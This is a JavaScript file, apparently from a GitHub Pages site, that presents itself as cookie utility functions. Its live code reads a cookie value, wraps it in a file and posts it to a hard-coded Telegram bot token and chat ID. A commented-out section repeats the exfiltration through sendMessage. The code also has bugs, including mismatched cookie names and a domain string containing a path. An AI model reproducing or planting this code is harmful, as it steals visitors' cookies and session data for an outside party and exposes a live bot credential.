// Reset the themeName cookie
setCookie("themeName", "", 1);

//Function to generate a unique identifier
function generateUniqueId() {
  return "id-" + Math.random().toString(36).substr(2, 16);
}

// Function to set a cookie
function setCookie(name, value, days) {
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie =
    name +
    "=" +
    (value || "") +
    expires +
    "; path=/; domain=richyyyo.github.io/windjb/; SameSite=Lax; Secure";
}

// Function to set a cookie wuth a unique identifier
function setPersistentCookie(name, value, days) {
  let uniqueID = generateUniqueId();
  let expires = "";
  if (days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    expires = "; expires=" + date.toUTCString();
  }

  document.cookie =
    name +
    "=" +
    (value || "") +
    expires +
    "; path=/; domain=richyyyo.github.io/windjb/; SameSite=Lax; Secure; uniqueId=" +
    uniqueID;
}

//Function to get the value of a cookie by name
function getPersistentCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === "") c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

//Example usage
setPersistentCookie("myPersistantCookie", "cookieValue", 15);
const cookieValue = getPersistentCookie("myPersistentCookie");
console.log(cookieValue);

if (cookieValue) {
  const blob = new Blob([cookieValue], { type: "text/plain" });
  const file = new File([blob], "cookie.txt");

  // Data to bot
  const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
  const chatId = "1139790477";

  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("document", file);

  async function sendFile() {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendDocument`,
        {
          method: "POST",
          body: formData,
        }
      );
      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error("Error sending file to Telegram:", error);
    }
  }

  sendFile();
}

/* 
// Retrive cookie value
const cookieValue = getCookie("uniqueID");

if (cookieValue) {
  const blob = new Blob([cookieValue], { type: "text/plain" });
  const file = new File([blob], "cookie.txt");

  // Create a link element
  //const link = document.createElement("a");
  //link.href = URL.createObjectURL(blob);
 // link.download = "cookie.txt";
 // document.body.appendChild(link);
 // link.click();
 // document.body.removeChild(link);
}

// Data to bot
const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
const chatId = "1139790477";

/* async function sendCookieToTelegram() {
  const cookieValue = getCookie("uniqueID");
  if (cookieValue) {
    const message = `Cookie Value: ${cookieValue}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  }
} */
